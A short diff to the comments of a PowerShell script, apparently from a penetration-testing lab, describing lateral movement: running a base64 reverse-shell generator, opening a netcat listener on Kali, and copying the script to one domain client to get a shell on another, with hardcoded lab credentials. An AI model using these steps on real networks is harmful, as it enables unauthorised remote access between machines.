@@ -1,7 +1,9 @@
 #Download PS_1a_base64_reverseshell.py & make sure you run it
 #open a NC -nlvp 1708 on your KALI
-#replace username and password with the user & password
+#assuming your target client is 192.168.203.74 (Client 74)
+#copy this script to the client machine later to run it to get a shell on another domain client machine. eg 192.168.203.72 (Client 72)
 
+#replace username and password with the user & password of the other domain client machine. eg: 192.168.203.72 (Client 72)
 $username = 'jen';
 $password = 'Nexus123!';
 
